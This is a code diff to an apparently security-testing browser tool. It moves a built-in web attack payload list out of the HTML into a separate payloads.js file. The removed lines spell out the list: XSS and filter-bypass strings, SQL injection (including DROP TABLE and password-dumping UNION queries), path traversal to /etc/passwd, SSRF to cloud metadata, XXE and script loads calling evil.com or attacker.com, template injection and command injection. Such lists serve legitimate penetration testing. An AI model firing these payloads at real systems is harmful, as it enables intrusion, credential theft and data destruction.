@@ -714,6 +714,7 @@ webview.active{visibility:visible;pointer-events:auto;}
   </button>
 </div>
 
+<script src="payloads.js"></script>
 <script>
 // ── State ────────────────────────────────────────────────────────────────────
 let tabs = [];
@@ -1633,91 +1634,7 @@ function copyEncResult() {
 }
 
 // ── PHANTOM: PAYLOADS ─────────────────────────────────────────────────────────
-const PAYLOADS = [
-  { cat:'XSS Básico', items:[
-    `<script>alert(1)</script>`,
-    `"><script>alert(document.domain)</script>`,
-    `'><img src=x onerror=alert(1)>`,
-    `javascript:alert(document.cookie)`,
-    `<svg onload=alert(1)>`,
-    `<img src=1 onerror=alert(document.cookie)>`,
-    `<details open ontoggle=alert(1)>`,
-    `"><iframe src=javascript:alert(1)>`,
-  ]},
-  { cat:'XSS Filter Bypass', items:[
-    `<ScRiPt>alert(1)</sCrIpT>`,
-    `%3Cscript%3Ealert(1)%3C/script%3E`,
-    `&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;`,
-    `<script>alert(1)</script>`,
-    `<scr\x00ipt>alert(1)</scr\x00ipt>`,
-    `<script/src=//evil.com>`,
-  ]},
-  { cat:'SQL Injection', items:[
-    `' OR '1'='1`,
-    `' OR 1=1--`,
-    `admin'--`,
-    `'; DROP TABLE users;--`,
-    `' UNION SELECT null,null,null--`,
-    `' UNION SELECT username,password FROM users--`,
-    `1' AND SLEEP(5)--`,
-    `'; WAITFOR DELAY '0:0:5'--`,
-  ]},
-  { cat:'SQLi Blind / Time-based', items:[
-    `1 AND 1=1`,
-    `1 AND 1=2`,
-    `1' AND SLEEP(5)-- -`,
-    `1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)`,
-    `'; IF (1=1) WAITFOR DELAY '0:0:5'--`,
-  ]},
-  { cat:'LFI / Path Traversal', items:[
-    `../../../etc/passwd`,
-    `..%2F..%2F..%2Fetc%2Fpasswd`,
-    `....//....//....//etc/passwd`,
-    `/etc/passwd`,
-    `C:\\Windows\\System32\\drivers\\etc\\hosts`,
-    `php://filter/convert.base64-encode/resource=index.php`,
-    `php://input`,
-  ]},
-  { cat:'SSRF', items:[
-    `http://127.0.0.1/`,
-    `http://localhost:80/`,
-    `http://169.254.169.254/latest/meta-data/`,
-    `http://[::1]/`,
-    `http://0.0.0.0/`,
-    `http://0177.0.0.1/`,
-    `http://2130706433/`,
-  ]},
-  { cat:'Open Redirect', items:[
-    `//evil.com`,
-    `/\\evil.com`,
-    `https://evil.com`,
-    `javascript:alert(document.domain)`,
-    `data:text/html,<script>alert(1)</script>`,
-    `/%09/evil.com`,
-  ]},
-  { cat:'XXE', items:[
-    `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`,
-    `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://attacker.com/">]><root>&xxe;</root>`,
-  ]},
-  { cat:'SSTI (Jinja2/Twig)', items:[
-    `{{7*7}}`,
-    `{{config}}`,
-    `{{''.__class__.__mro__[2].__subclasses__()}}`,
-    `{% for c in [1,2,3] %}{{c}}{% endfor %}`,
-    `${7*7}`,
-    `<%= 7*7 %>`,
-  ]},
-  { cat:'Command Injection', items:[
-    `; ls -la`,
-    `| whoami`,
-    `& whoami`,
-    `\`whoami\``,
-    `$(whoami)`,
-    `; cat /etc/passwd`,
-    `%0a whoami`,
-  ]},
-];
-
+// PAYLOADS is defined in payloads.js (separate file — avoids HTML parser closing the script block)
 let _payloadStore = [];
 
 function renderPayloads(filter) {
